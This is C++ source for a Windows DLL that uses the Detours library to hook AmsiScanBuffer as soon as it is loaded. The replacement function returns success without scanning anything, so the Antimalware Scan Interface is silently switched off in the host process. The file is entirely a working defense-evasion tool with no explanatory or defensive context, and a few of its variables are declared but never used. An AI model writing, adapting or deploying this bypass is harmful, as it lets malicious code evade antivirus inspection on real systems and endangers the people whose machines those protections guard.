#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <detours/detours.h>
#include <amsi.h>

FARPROC amsiScanBufferAddress = NULL;
SIZE_T byteswritten = 0;
char amsiScanBufferOriginalBytes[14] = {};

typedef HRESULT(WINAPI* AmsiScanBuffer_t)(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
    );
AmsiScanBuffer_t AmsiScanBuffer_p = (AmsiScanBuffer_t)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

HRESULT HookedAmsiScanBuffer(HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result)
{
    printf("AmsiScanBuffer is hooked\n");

    return S_OK;
}

void Hook()
{
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)AmsiScanBuffer_p, HookedAmsiScanBuffer);
    DetourTransactionCommit();
}

void Unhook()
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)AmsiScanBuffer_p, HookedAmsiScanBuffer);
    DetourTransactionCommit();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Hook();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        Unhook();
        break;
    }
    return TRUE;
}
